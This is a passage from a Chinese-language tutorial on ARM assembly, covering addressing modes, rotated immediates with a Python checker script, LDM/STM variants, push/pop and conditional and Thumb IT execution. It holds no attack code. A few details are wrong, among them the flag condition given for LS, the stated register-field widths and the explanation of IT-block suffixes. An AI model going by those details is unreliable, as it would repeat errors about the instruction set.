class="line"><span class="symbol">adr_var1:</span> <span class="meta">.word</span> var1</span><br><span class="line"><span class="symbol">adr_var2:</span> <span class="meta">.word</span> var2</span><br></pre></td></tr></table></figure>

<p>在偏移地址模式下执行第一个STR操作后，R2的值（0x00000003）将存储在内存地址0x0001009c + 0x00000003 = 0x0001009F。</p>
<h4 id="Scaled寄存器作偏移"><a href="#Scaled寄存器作偏移" class="headerlink" title="Scaled寄存器作偏移"></a>Scaled寄存器作偏移</h4><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span>    Ra, [Rb, Rc, &lt;shifter&gt;]</span><br><span class="line"><span class="keyword">STR</span>    Ra, [Rb, Rc, &lt;shifter&gt;]</span><br></pre></td></tr></table></figure>

<p>第三种偏移形式有一个缩放寄存器作为偏移。 在这种情况下，Rb 是基址寄存器，Rc 是立即偏移量（或包含立即值的寄存器）左/右移位 (&lt;shifter&gt;) 以缩放立即数。 这意味着桶形移位器用于缩放偏移。 这种偏移形式的一个示例用法是循环遍历数组。</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data</span></span><br><span class="line"><span class="symbol">var1:</span> <span class="meta">.word</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">var2:</span> <span class="meta">.word</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r0</span>, adr_var1         <span class="comment">@ load the memory address of var1 via label adr_var1 to R0</span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r1</span>, adr_var2         <span class="comment">@ load the memory address of var2 via label adr_var2 to R1</span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r2</span>, [<span class="built_in">r0</span>]             <span class="comment">@ load the value (0x03) at memory address found in R0 to R2</span></span><br><span class="line">    <span class="keyword">str</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="built_in">r2</span>, LSL<span class="number">#2</span>]  <span class="comment">@ address mode: offset. Store the value found in R2 (0x03) to the memory address found in R1 with the offset R2 left-shifted by 2. Base register (R1) unmodified.</span></span><br><span class="line">    <span class="keyword">str</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="built_in">r2</span>, LSL<span class="number">#2</span>]! <span class="comment">@ address mode: pre-indexed. Store the value found in R2 (0x03) to the memory address found in R1 with the offset R2 left-shifted by 2. Base register modified: R1 = R1 + R2&lt;&lt;2</span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r3</span>, [<span class="built_in">r1</span>], <span class="built_in">r2</span>, LSL<span class="number">#2</span>  <span class="comment">@ address mode: post-indexed. Load value at memory address found in R1 to the register R3. Then modifiy base register: R1 = R1 + R2&lt;&lt;2</span></span><br><span class="line">    <span class="keyword">bkpt</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">adr_var1:</span> <span class="meta">.word</span> var1</span><br><span class="line"><span class="symbol">adr_var2:</span> <span class="meta">.word</span> var2</span><br></pre></td></tr></table></figure>

<p>第一个 STR 操作使用偏移地址模式，并将在 R2 中找到的值存储在从 [r1, r2, LSL#2] 计算出的内存位置，这意味着它以 R1 中的值为基数（在这种情况下，R1 包含 var2 的内存地址)，然后取 R2 (0x3) 中的值，并将其左移 2。下图是尝试可视化如何使用 [r1, r2, LSL#2] 计算内存位置 .</p>
<h3 id="在arm上使用立即数"><a href="#在arm上使用立即数" class="headerlink" title="在arm上使用立即数"></a>在arm上使用立即数</h3><p>在 ARM 上的寄存器中加载立即值并不像在 x86 上那样简单。您可以使用哪些直接值是有限制的。可以使用一些技巧来绕过这些限制（提示：LDR）。</p>
<p>我们知道每条 ARM 指令都是 32bit 长的，所有指令都是有条件的。我们可以使用16个条件码，一个条件码占指令的4位。然后我们需要 2 位作为目标寄存器。 2 位用于第一个操作数寄存器，1 位用于设置状态标志，以及用于其他事项（如实际操作码）的各种位。这里的重点是，在为指令类型、寄存器和其他字段分配位后，立即数只剩下 12 位，这将只允许 4096 个不同的值。</p>
<p>这意味着 ARM 指令只能直接在 MOV 中使用有限范围的立即数。如果一个数字不能直接使用，就必须把它分成几部分，由多个较小的数字拼凑起来。</p>
<p>但还有更多。不是将 12 位用于单个整数，而是将这 12 位拆分为一个 8 位数字 (n)，能够加载 0-255 范围内的任何 8 位值，以及一个 4 位旋转字段 (r) 作为一个在 0 到 30 之间以 2 为步长向右循环。这意味着完整的立即数 v 由以下公式给出：v = n ror 2*r。换句话说，唯一有效的立即数是循环字节（可以减少到循环一个偶数的字节的值）。</p>
<p>以下是一些有效和无效的立即数的例子：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Valid</span> values:</span><br><span class="line"><span class="comment">#256        // 1 ror 24 --&gt; 256</span></span><br><span class="line"><span class="comment">#384        // 6 ror 26 --&gt; 384</span></span><br><span class="line"><span class="comment">#484        // 121 ror 30 --&gt; 484</span></span><br><span class="line"><span class="comment">#16384      // 1 ror 18 --&gt; 16384</span></span><br><span class="line"><span class="comment">#2030043136 // 121 ror 8 --&gt; 2030043136</span></span><br><span class="line"><span class="comment">#0x06000000 // 6 ror 8 --&gt; 100663296 (0x06000000 in hex)</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">Invalid</span> values:</span><br><span class="line"><span class="comment">#370        // 185 ror 31 --&gt; 31 is not in range (0 – 30)</span></span><br><span class="line"><span class="comment">#511        // 1 1111 1111 --&gt; bit-pattern can’t fit into one byte</span></span><br><span class="line"><span class="comment">#0x06010000 // 1 1000 0001.. --&gt; bit-pattern can’t fit into one byte</span></span><br></pre></td></tr></table></figure>

<p>这导致无法一次性加载完整的 32 位地址。 我们可以使用以下两个选项之一绕过此限制：</p>
<ol>
<li>用较小的部分构造较大的值：不使用<code>Mov r0 ,#511</code>,分割511到两部分:<code>MOV r0, #256, and ADD r0, #255</code></li>
<li>使用加载结构<code>ldr r1,=value</code>，如果不可能，汇编器会很乐意将其转换为 MOV 或与 PC 相关的加载。比如：<code>LDR r1, =511</code></li>
</ol>
<p>如果你试图加载一个无效的立即数，汇编器会产生一个错误，”Error: invalid constant.”,<br>如果您需要弄清楚某个数字是否可以用作有效的立即数，则无需自己计算。 您可以使用我的名为 <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py">rotator.py</a> 的小 Python 脚本，它将您的号码作为输入并告诉您它是否可以用作有效的立即数。</p>
<p>rotator.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function   <span class="comment"># PEP 3105</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rotate right: 0b1001 --&gt; 0b1100</span></span><br><span class="line">ror = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>)) &gt;&gt; r_bits%max_bits) | \</span><br><span class="line">    (val &lt;&lt; (max_bits-(r_bits%max_bits)) &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">max_bits = <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span> = <span class="built_in">int</span>(raw_input(<span class="string">&quot;Enter the value you want to check: &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">31</span>, <span class="number">2</span>):</span><br><span class="line"></span><br><span class="line">        rotated = ror(n, i, max_bits)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(rotated == <span class="built_in">input</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The number %i can be used as a valid immediate number.&quot;</span> % <span class="built_in">input</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%i ror %x --&gt; %s&quot;</span> % (n, <span class="built_in">int</span>(<span class="built_in">str</span>(i), <span class="number">16</span>), rotated))</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sorry, %i cannot be used as an immediate number and has to be split.&quot;</span> % <span class="built_in">input</span>)</span><br></pre></td></tr></table></figure>

<h2 id="load-store-多个值"><a href="#load-store-多个值" class="headerlink" title="load/store 多个值"></a>load/store 多个值</h2><p>有时一次加载（或存储）多个值更有效。为此，我们使用LDM（负载倍数）和STM（存储倍数）。这些指令的变体基本上只因访问初始地址的方式而异。这是我们本节将使用的代码。我们将一步一步地完成每项指令。</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">array_buff:</span></span><br><span class="line"> <span class="meta">.word</span> <span class="number">0x00000000</span>             <span class="comment">/* array_buff[0] */</span></span><br><span class="line"> <span class="meta">.word</span> <span class="number">0x00000000</span>             <span class="comment">/* array_buff[1] */</span></span><br><span class="line"> <span class="meta">.word</span> <span class="number">0x00000000</span>             <span class="comment">/* array_buff[2]. This element has a relative address of array_buff+8 */</span></span><br><span class="line"> <span class="meta">.word</span> <span class="number">0x00000000</span>             <span class="comment">/* array_buff[3] */</span></span><br><span class="line"> <span class="meta">.word</span> <span class="number">0x00000000</span>             <span class="comment">/* array_buff[4] */</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"> <span class="keyword">adr</span> <span class="built_in">r0</span>, words+<span class="number">12</span>             <span class="comment">/* address of words[3] -&gt; r0 */</span></span><br><span class="line"> <span class="keyword">ldr</span> <span class="built_in">r1</span>, array_buff_bridge    <span class="comment">/* address of array_buff[0] -&gt; r1 */</span></span><br><span class="line"> <span class="keyword">ldr</span> <span class="built_in">r2</span>, array_buff_bridge+<span class="number">4</span>  <span class="comment">/* address of array_buff[2] -&gt; r2 */</span></span><br><span class="line"> <span class="keyword">ldm</span> <span class="built_in">r0</span>, &#123;<span class="built_in">r4</span>,<span class="built_in">r5</span>&#125;              <span class="comment">/* words[3] -&gt; r4 = 0x03; words[4] -&gt; r5 = 0x04 */</span></span><br><span class="line"> <span class="keyword">stm</span> <span class="built_in">r1</span>, &#123;<span class="built_in">r4</span>,<span class="built_in">r5</span>&#125;              <span class="comment">/* r4 -&gt; array_buff[0] = 0x03; r5 -&gt; array_buff[1] = 0x04 */</span></span><br><span class="line"> <span class="keyword">ldmia</span> <span class="built_in">r0</span>, &#123;<span class="built_in">r4</span>-<span class="built_in">r6</span>&#125;            <span class="comment">/* words[3] -&gt; r4 = 0x03, words[4] -&gt; r5 = 0x04; words[5] -&gt; r6 = 0x05; */</span></span><br><span class="line"> <span class="keyword">stmia</span> <span class="built_in">r1</span>, &#123;<span class="built_in">r4</span>-<span class="built_in">r6</span>&#125;            <span class="comment">/* r4 -&gt; array_buff[0] = 0x03; r5 -&gt; array_buff[1] = 0x04; r6 -&gt; array_buff[2] = 0x05 */</span></span><br><span class="line"> <span class="keyword">ldmib</span> <span class="built_in">r0</span>, &#123;<span class="built_in">r4</span>-<span class="built_in">r6</span>&#125;            <span class="comment">/* words[4] -&gt; r4 = 0x04; words[5] -&gt; r5 = 0x05; words[6] -&gt; r6 = 0x06 */</span></span><br><span class="line"> <span class="keyword">stmib</span> <span class="built_in">r1</span>, &#123;<span class="built_in">r4</span>-<span class="built_in">r6</span>&#125;            <span class="comment">/* r4 -&gt; array_buff[1] = 0x04; r5 -&gt; array_buff[2] = 0x05; r6 -&gt; array_buff[3] = 0x06 */</span></span><br><span class="line"> <span class="keyword">ldmda</span> <span class="built_in">r0</span>, &#123;<span class="built_in">r4</span>-<span class="built_in">r6</span>&#125;            <span class="comment">/* words[3] -&gt; r6 = 0x03; words[2] -&gt; r5 = 0x02; words[1] -&gt; r4 = 0x01 */</span></span><br><span class="line"> <span class="keyword">ldmdb</span> <span class="built_in">r0</span>, &#123;<span class="built_in">r4</span>-<span class="built_in">r6</span>&#125;            <span class="comment">/* words[2] -&gt; r6 = 0x02; words[1] -&gt; r5 = 0x01; words[0] -&gt; r4 = 0x00 */</span></span><br><span class="line"> <span class="keyword">stmda</span> <span class="built_in">r2</span>, &#123;<span class="built_in">r4</span>-<span class="built_in">r6</span>&#125;            <span class="comment">/* r6 -&gt; array_buff[2] = 0x02; r5 -&gt; array_buff[1] = 0x01; r4 -&gt; array_buff[0] = 0x00 */</span></span><br><span class="line"> <span class="keyword">stmdb</span> <span class="built_in">r2</span>, &#123;<span class="built_in">r4</span>-<span class="built_in">r5</span>&#125;            <span class="comment">/* r5 -&gt; array_buff[1] = 0x01; r4 -&gt; array_buff[0] = 0x00; */</span></span><br><span class="line"> <span class="keyword">bx</span> <span class="built_in">lr</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">words:</span></span><br><span class="line"> <span class="meta">.word</span> <span class="number">0x00000000</span>             <span class="comment">/* words[0] */</span></span><br><span class="line"> <span class="meta">.word</span> <span class="number">0x00000001</span>             <span class="comment">/* words[1] */</span></span><br><span class="line"> <span class="meta">.word</span> <span class="number">0x00000002</span>             <span class="comment">/* words[2] */</span></span><br><span class="line"> <span class="meta">.word</span> <span class="number">0x00000003</span>             <span class="comment">/* words[3] */</span></span><br><span class="line"> <span class="meta">.word</span> <span class="number">0x00000004</span>             <span class="comment">/* words[4] */</span></span><br><span class="line"> <span class="meta">.word</span> <span class="number">0x00000005</span>             <span class="comment">/* words[5] */</span></span><br><span class="line"> <span class="meta">.word</span> <span class="number">0x00000006</span>             <span class="comment">/* words[6] */</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">array_buff_bridge:</span></span><br><span class="line"> <span class="meta">.word</span> array_buff             <span class="comment">/* address of array_buff, or in other words - array_buff[0] */</span></span><br><span class="line"> <span class="meta">.word</span> array_buff+<span class="number">8</span>           <span class="comment">/* address of array_buff[2] */</span></span><br></pre></td></tr></table></figure>

<p>在开始之前，请记住，.word 指的是 32 位 = 4 BYTES 的数据（内存）块。 这对于理解偏移很重要。 因此该程序由 .data 部分组成，我们在其中分配了一个具有 5 个元素的空数组 (array_buff)。 我们将使用它作为存储数据的可写内存位置。 .text 部分包含我们的代码以及内存操作指令和一个包含两个标签的只读数据池：一个用于具有 7 个元素的数组，另一个用于“桥接” .text 和 .data 部分，以便我们可以访问驻留的 array_buff 在 .data 部分。</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">adr</span> <span class="built_in">r0</span>, words+<span class="number">12</span>             <span class="comment">/* address of words[3] -&gt; r0 */</span></span><br></pre></td></tr></table></figure>

<p>我们使用 ADR 指令将第 4 个元素（words[3]）的地址放入 R0。 我们指向 words 数组的中间，因为我们将从那里向前和向后操作。</p>
<p>我们用 array_buff 数组的第一个 (array_buff[0]) 和第三个 (array_buff[2]) 元素的地址准备 R1 和 R2。 一旦获得地址，我们就可以开始对其进行操作。</p>
<p>下一条指令使用 LDM 从 R0 指向的内存中加载两个字值。 因此，因为我们之前让 R0 指向 words[3] 元素，所以 words[3] 值转到 R4，words[4] 值转到 R5。</p>
<p>下一条指令让我们执行 STM 指令将多个值存储到内存中。 我们代码中的 STM 指令从寄存器 R4 和 R5 获取值（0x3 和 0x4），并将这些值存储到 R1 指定的内存位置。</p>
<p>变体的类型由指令的后缀定义。 示例中使用的后缀是：-IA（之后增加）、-IB（之前增加）、-DA（之后减少）、-DB（之前减少）。 这些变体的不同之处在于它们如何访问由第一个操作数（存储源地址或目标地址的寄存器）指定的内存。 实际上，LDM 与 LDMIA 相同，这意味着每次加载后都会增加下一个要加载的元素的地址。 通过这种方式，我们从第一个操作数（存储源地址的寄存器）指定的内存地址中获得顺序（前向）数据加载。</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ldmia</span> <span class="built_in">r0</span>, &#123;<span class="built_in">r4</span>-<span class="built_in">r6</span>&#125; <span class="comment">/* words[3] -&gt; r4 = 0x03, words[4] -&gt; r5 = 0x04; words[5] -&gt; r6 = 0x05; */</span> </span><br><span class="line"><span class="keyword">stmia</span> <span class="built_in">r1</span>, &#123;<span class="built_in">r4</span>-<span class="built_in">r6</span>&#125; <span class="comment">/* r4 -&gt; array_buff[0] = 0x03; r5 -&gt; array_buff[1] = 0x04; r6 -&gt; array_buff[2] = 0x05 */</span></span><br></pre></td></tr></table></figure>

<p>执行上述两条指令后，寄存器 R4-R6 和内存地址 0x000100D0、0x000100D4 和 0x000100D8 包含值 0x3、0x4 和 0x5。</p>
<p>LDMIB 指令首先将源地址增加 4 个字节（一个字值），然后执行第一次加载。 通过这种方式，我们仍然可以顺序（向前）加载数据，但第一个元素与源地址有 4 个字节的偏移量。 这就是为什么在我们的示例中，通过 LDMIB 指令从内存加载到 R4 的第一个元素是 0x00000004（word[4]）而不是 R0 指向的 0x00000003（word[3]）。</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ldmib</span> <span class="built_in">r0</span>, &#123;<span class="built_in">r4</span>-<span class="built_in">r6</span>&#125;            <span class="comment">/* words[4] -&gt; r4 = 0x04; words[5] -&gt; r5 = 0x05; words[6] -&gt; r6 = 0x06 */</span></span><br><span class="line"><span class="keyword">stmib</span> <span class="built_in">r1</span>, &#123;<span class="built_in">r4</span>-<span class="built_in">r6</span>&#125;            <span class="comment">/* r4 -&gt; array_buff[1] = 0x04; r5 -&gt; array_buff[2] = 0x05; r6 -&gt; array_buff[3] = 0x06 */</span></span><br></pre></td></tr></table></figure>

<p>执行上述两条指令后，寄存器 R4-R6 和内存地址 0x100D4、0x100D8 和 0x100DC 包含值 0x4、0x5 和 0x6。</p>
<p>当我们使用 LDMDA 指令时，一切都开始向后运行。 R0 指向word[3]。 当加载开始时，我们向后移动并将word[3]、word[2]和word[1]加载到R6、R5、R4中。 是的，寄存器也是反向加载的。 所以在指令完成后 R6 = 0x00000003，R5 = 0x00000002，R4 = 0x00000001。</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ldmda</span> <span class="built_in">r0</span>, &#123;<span class="built_in">r4</span>-<span class="built_in">r6</span>&#125; <span class="comment">/* words[3] -&gt; r6 = 0x03; words[2] -&gt; r5 = 0x02; words[1] -&gt; r4 = 0x01 */</span></span><br></pre></td></tr></table></figure>

<p>加载多个，递减后：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ldmdb</span> <span class="built_in">r0</span>, &#123;<span class="built_in">r4</span>-<span class="built_in">r6</span>&#125; <span class="comment">/* words[2] -&gt; r6 = 0x02; words[1] -&gt; r5 = 0x01; words[0] -&gt; r4 = 0x00 */</span></span><br></pre></td></tr></table></figure>

<p>store多个，递减后：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">stmda</span> <span class="built_in">r2</span>, &#123;<span class="built_in">r4</span>-<span class="built_in">r6</span>&#125; <span class="comment">/* r6 -&gt; array_buff[2] = 0x02; r5 -&gt; array_buff[1] = 0x01; r4 -&gt; array_buff[0] = 0x00 */</span></span><br></pre></td></tr></table></figure>

<h3 id="push-and-pop"><a href="#push-and-pop" class="headerlink" title="push and pop"></a>push and pop</h3><p>PUSH：</p>
<ol>
<li>SP -= 4</li>
<li>信息store到新地址</li>
</ol>
<p>POP：</p>
<ol>
<li>SP地址处的value被load到指示的register中</li>
<li>SP += 4</li>
</ol>
<h2 id="条件执行"><a href="#条件执行" class="headerlink" title="条件执行"></a>条件执行</h2><table>
<thead>
<tr>
<th>Condition Code</th>
<th>Meaning (for cmp or subs)</th>
<th>Status of Flags</th>
</tr>
</thead>
<tbody><tr>
<td>EQ</td>
<td>Equal</td>
<td>Z==1</td>
</tr>
<tr>
<td>NE</td>
<td>Not Equal</td>
<td>Z==0</td>
</tr>
<tr>
<td>GT</td>
<td>Signed Greater Than</td>
<td>(Z==0) &amp;&amp; (N==V)</td>
</tr>
<tr>
<td>LT</td>
<td>Signed Less Than</td>
<td>N!=V</td>
</tr>
<tr>
<td>GE</td>
<td>Signed Greater Than or Equal</td>
<td>N==V</td>
</tr>
<tr>
<td>LE</td>
<td>Signed Less Than or Equal</td>
<td>(Z==1) || (N!=V)</td>
</tr>
<tr>
<td>CS or HS</td>
<td>Unsigned Higher or Same (or Carry Set)</td>
<td>C==1</td>
</tr>
<tr>
<td>CC or LO</td>
<td>Unsigned Lower (or Carry Clear)</td>
<td>C==0</td>
</tr>
<tr>
<td>MI</td>
<td>Negative (or Minus)</td>
<td>N==1</td>
</tr>
<tr>
<td>PL</td>
<td>Positive (or Plus)</td>
<td>N==0</td>
</tr>
<tr>
<td>AL</td>
<td>Always executed</td>
<td>–</td>
</tr>
<tr>
<td>NV</td>
<td>Never executed</td>
<td>–</td>
</tr>
<tr>
<td>VS</td>
<td>Signed Overflow</td>
<td>V==1</td>
</tr>
<tr>
<td>VC</td>
<td>No signed Overflow</td>
<td>V==0</td>
</tr>
<tr>
<td>HI</td>
<td>Unsigned Higher</td>
<td>(C==1) &amp;&amp; (Z==0)</td>
</tr>
<tr>
<td>LS</td>
<td>Unsigned Lower or same</td>
<td>(C==0) || (Z==0)</td>
</tr>
</tbody></table>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.global</span> main</span><br><span class="line"></span><br><span class="line"><span class="symbol">main:</span></span><br><span class="line">        <span class="keyword">mov</span>     <span class="built_in">r0</span>, <span class="number">#2</span>     <span class="comment">/* setting up initial variable */</span></span><br><span class="line">        <span class="keyword">cmp</span>     <span class="built_in">r0</span>, <span class="number">#3</span>     <span class="comment">/* comparing r0 to number 3. Negative bit get&#x27;s set to 1 */</span></span><br><span class="line">        <span class="keyword">addlt</span>   <span class="built_in">r0</span>, <span class="built_in">r0</span>, <span class="number">#1</span> <span class="comment">/* increasing r0 IF it was determined that it is smaller (lower than) number 3 */</span></span><br><span class="line">        <span class="keyword">cmp</span>     <span class="built_in">r0</span>, <span class="number">#3</span>     <span class="comment">/* comparing r0 to number 3 again. Zero bit gets set to 1. Negative bit is set to 0 */</span></span><br><span class="line">        <span class="keyword">addlt</span>   <span class="built_in">r0</span>, <span class="built_in">r0</span>, <span class="number">#1</span> <span class="comment">/* increasing r0 IF it was determined that it is smaller (lower than) number 3 */</span></span><br><span class="line">        <span class="keyword">bx</span>      <span class="built_in">lr</span></span><br></pre></td></tr></table></figure>

<p>上面代码中的第一条 CMP 指令触发负位被置位 (2 – 3 = -1) 表示 r0 中的值低于数字 3。随后执行 ADDLT 指令，因为当 V 时 LT 条件已满！ = N（CPSR 中溢出位和负位的值不同）。 在我们执行第二个 CMP 之前，我们的 r0 = 3。这就是为什么第二个 CMP 清除负位（因为 3 – 3 = 0，不需要设置负标志）并设置零标志（Z = 1）。 现在我们有 V = 0 和 N = 0 这导致 LT 条件失败。 因此，不会执行第二个 ADDLT，并且 r0 保持不变。 程序退出，结果为 3。</p>
<h3 id="Thumb条件执行"><a href="#Thumb条件执行" class="headerlink" title="Thumb条件执行"></a>Thumb条件执行</h3><p>在允许条件执行的 Thumb 版本 (Thumb-2)中。 某些 ARM 处理器版本支持“IT”指令，该指令允许在 Thumb 状态下有条件地执行最多 4 条指令。</p>
<p>语法：IT{x{y{z}}} cond</p>
<ol>
<li>cond 指定 IT 块中第一条指令的条件</li>
<li>x 指定 IT 块中第二条指令的条件开关</li>
<li>y 指定 IT 块中第三条指令的条件开关</li>
<li>z 指定 IT 块中第四条指令的条件开关</li>
</ol>
<p>IT 指令的结构是“IF-Then-(Else)”，语法是两个字母 T 和 E 的结构：</p>
<ol>
<li>IT 指的是 If-Then（下一条指令是有条件的）</li>
<li>ITT 指的是 If-Then-Then（接下来的 2 条指令是有条件的）</li>
<li>ITE 指的是 If-Then-Else（接下来的 2 条指令是有条件的）</li>
<li>ITTE 指的是 If-Then-Then-Else（接下来的 3 条指令是有条件的）</li>
<li>ITTEE 指的是 If-Then-Then-Else-Else（接下来的 4 条指令是有条件的）</li>
</ol>
<p>IT 块内的每条指令都必须指定一个条件后缀，该后缀相同或逻辑相反。 这意味着，如果您使用 ITE，则第一条和第二条指令 (If-Then) 必须具有相同的条件后缀，而第三条 (Else) 必须具有前两条的逻辑逆。</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ITTE</span>   NE           <span class="comment">; Next 3 instructions are conditional</span></span><br><span class="line"><span class="keyword">ANDNE</span>  <span class="built_in">R0</span>, <span class="built_in">R0</span>, <span class="built_in">R1</span>   <span class="comment">; ANDNE does not update condition flags</span></span><br><span class="line"><span class="symbol">ADDSNE</span> <span class="built_in">R2</span>, <span class="built_in">R2</span>, <span class="number">#1</span>   <span class="comment">; ADDSNE updates condition flags</span></span><br><span class="line"><span class="keyword">MOVEQ</span>  <span class="built_in">R2</span>, <span class="built_in">R3</span>       <span class="comment">; Conditional move</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ITE</span>    GT           <span class="comment">; Next 2 instructions are conditional</span></span><br><span class="line"><span class="keyword">ADDGT</span>  <span class="built_in">R1</span>, <span class="built_in">R0</span>, <span class="number">#55</span>  <span class="comment">; Conditional addition in case the GT is true</span></span><br><span class="line"><span class="keyword">ADDLE</span>  <span class="built_in">R1</span>, <span class="built_in">R0</span>, <span class="number">#48</span>  <span class="comment">; Conditional addition in case the GT is not true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ITTEE</span>  EQ           <span class="comment">; Next 4 instructions are conditional</span></span><br><span class="line"><span class="keyword">MOVEQ</span>  <span class="built_in">R0</span>, <span class="built_in">R1</span>       <span class="comment">; Conditional MOV</span></span><br><span class="line"><span class="keyword">ADDEQ</span>  <span class="built_in">R2</span>, <span class="built_in">R2</span>, <span class="number">#10</span>  <span class="comment">; Conditional ADD</span></span><br><span class="line"><span class="keyword">ANDNE</span>  <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="number">#1</span>   <span class="comment">; Conditional AND</span></span><br><span class="line"><span class="symbol">BNE.W</span>  dloop        